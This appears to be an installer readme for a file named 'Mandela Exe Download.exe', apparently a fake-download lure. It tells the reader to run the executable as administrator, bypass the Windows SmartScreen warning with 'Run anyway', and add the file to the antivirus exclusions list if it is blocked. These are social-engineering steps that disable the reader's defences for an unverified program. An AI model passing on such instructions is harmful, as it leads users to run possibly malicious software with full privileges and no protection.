================================================
  Mandela Exe Download — Installation Instructions
================================================

INSTALLATION GUIDE:
1. Right-click on Mandela Exe Download.exe and select 'Run as administrator'
2. If Windows SmartScreen appears, click 'More info' → 'Run anyway'
3. Follow the installation wizard instructions
4. Choose your installation directory
5. Click 'Install' and wait for completion
6. Launch Mandela Exe Download from your Start menu or desktop

TROUBLESHOOTING:
• If antivirus blocks the file: add it to exclusions list temporarily
• Run installer as Administrator (right-click → Run as administrator)
• Ensure you have at least 1 GB free disk space
• Supported OS: Windows 10 / Windows 11 (64-bit)

================================================
  Thank you for downloading!
================================================